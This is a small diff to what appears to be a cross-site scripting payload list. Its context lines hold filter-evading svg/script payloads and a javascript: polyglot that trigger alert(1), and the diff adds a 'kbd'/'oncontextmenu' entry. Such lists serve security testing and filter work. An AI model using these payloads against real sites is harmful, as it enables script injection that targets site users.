@@ -15,3 +15,6 @@ javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onm
 <svg><script>&#97;lert(1)</script></svg>
 <svg><script>alert&NewLine;(1)</script></svg>
 <svg><script>x="&quot;,alert(1)//";</script></svg>
+
+
+"<kbd", "oncontextmenu",
